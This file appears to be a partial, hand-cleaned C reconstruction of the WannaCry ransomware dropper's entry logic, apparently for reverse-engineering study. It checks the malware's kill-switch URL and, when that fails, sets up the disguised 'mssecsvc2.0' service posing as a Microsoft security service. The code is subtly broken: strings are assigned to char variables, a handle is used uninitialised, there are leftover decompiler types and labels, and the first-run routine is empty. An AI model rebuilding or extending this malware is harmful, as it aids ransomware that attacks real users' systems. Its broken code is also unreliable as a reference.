#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Functions Called
void Create_SvcsConfigs(void);
void if_first_time_executing_on_system_do_config(void);

// arguments to GetProcAddress
char CreateProcessA_str[] = "CreateProcessA";
char CreateFileA_str[] = "CreateFileA";
char WriteFileA_str[] = "WriteFileA";
char CloseHandle_str = "CloseHandle";


// dinamically loadeds
char Kernel32_dll = "kernel32.dll";

// Services Dispatcher configs
char MSC_2_0_SvcName[] = "Microsoft Security Center (2.0) Service";
char wannacry_exe_path[260];
char mssecsvc2_0_string[] = "mssecsvc2.0";
char weird_url[] = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";


int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCmd)
{
  HINTERNET hInternet;
  HINTERNET internet_open_url_HANDLE;
  int iVar1;
  char *werid_url_cp;
  undefined4 *weird_url_cpy2;
  undefined4 local_50 [14];
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined4 local_b;
  undefined4 local_7;
  undefined2 local_3;
  undefined local_1;
  
  iVar1 = 14;
  werid_url_cp = weird_url;
  weird_url_cpy2 = local_50;
  
  strcpy( weird_url_cpy2 , weird_url_cp );
  // *(char *)weird_url_cpy2 = *werid_url_cp;
  
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_7 = 0;
  local_3 = 0;
  local_1 = 0;
  
  InternetOpenA((LPCSTR)0x0,1,(LPCSTR)0x0,(LPCSTR)0x0,0);
  internet_open_url_HANDLE = InternetOpenUrlA(hInternet,(LPCSTR)local_50,(LPCSTR)0x0,0,2214592512,0)
  ;
                    /* if it fails... */
  if (internet_open_url_HANDLE == (HINTERNET)0x0) {
    InternetCloseHandle(hInternet);
    InternetCloseHandle(0);
    Create_SvcsConfigs();
                    /* else, connect, and do nothing */
    return 0;
  }
  InternetCloseHandle(hInternet);
  InternetCloseHandle(internet_open_url_HANDLE);
  return 0;
}


void Create_SvcsConfigs(void)
{
     int *argc;
  SC_HANDLE openSCManagerH;
  SC_HANDLE OpenServiceH;
  SERVICE_TABLE_ENTRYA TEntry_Dispatcher;
  
                    /* get the path of the current running process */
  GetModuleFileNameA((HMODULE)0x0,(LPSTR)&wannacry_exe_path,260);
  argc = (int *)__p___argc();
                    /* if you runned the process without any arg, i.e. C:\path\to\wanacry */
  if (*argc < 2) {
    if_first_time_executing_on_system_do_config();
                    /* else... */
    return;
  }
  openSCManagerH = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,983103);
                    /* in sucess... */
  if (openSCManagerH != (SC_HANDLE)0x0) {
    OpenServiceH = OpenServiceA(openSCManagerH,mssecsvc2_0_string,983551);
                    /* in success... */
    if (OpenServiceH != (SC_HANDLE)0x0) {
      change_wannacry_service_configs(OpenServiceH,60);
      CloseServiceHandle(OpenServiceH);
    }
    CloseServiceHandle(openSCManagerH);
  }
  TEntry_Dispatcher.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)&LAB_00408000;
  TEntry_Dispatcher.lpServiceName = mssecsvc2_0_string;
  StartServiceCtrlDispatcherA(&TEntry_Dispatcher);
  return;
}



void if_first_time_executing_on_system_do_config(void)
{
  
  
}
